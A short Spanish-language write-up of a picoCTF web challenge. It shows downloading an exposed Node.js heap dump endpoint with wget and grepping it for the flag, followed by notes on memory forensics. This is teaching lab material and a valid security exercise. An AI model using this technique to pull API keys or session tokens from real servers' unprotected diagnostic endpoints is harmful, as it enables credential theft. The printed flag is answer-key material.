## Descripción

Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.The website is running [picoCTF News](http://verbal-sleep.picoctf.net:54522/).
## Solución

**Solución 1
```
NazaretEsquivel-picoctf@webshell:~$ wget http://verbal-sleep.picoctf.net:54522/heapdump
--2026-03-28 05:06:50--  http://verbal-sleep.picoctf.net:54522/heapdump
Resolving verbal-sleep.picoctf.net (verbal-sleep.picoctf.net)... 3.138.217.147
Connecting to verbal-sleep.picoctf.net (verbal-sleep.picoctf.net)|3.138.217.147|:54522... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10770760 (10M) [application/octet-stream]
Saving to: 'heapdump'

heapdump             100%[=====================>]  10.27M  1.85MB/s    in 5.6s    

2026-03-28 05:06:57 (1.82 MB/s) - 'heapdump' saved [10770760/10770760]

NazaretEsquivel-picoctf@webshell:~$ strings heapdump | grep "picoCTF{"
picoCTF{Pat!3nt_15_Th3_K3y_871ffa9a}
```

#### NOTAS
-- **Concepto:** **Memory Forensics** en aplicaciones Web.
- **Técnica:** Los volcados de "heap" (montículo) de Node.js contienen una instantánea de todos los objetos y variables en memoria en el momento del dump.
- **Análisis:** Datos sensibles como claves de API, tokens de sesión o flags pueden quedar expuestos si el endpoint de diagnóstico no está protegido.
- **Herramienta:** `strings` (filtra datos binarios para mostrar texto) + `grep` (búsqueda de patrones).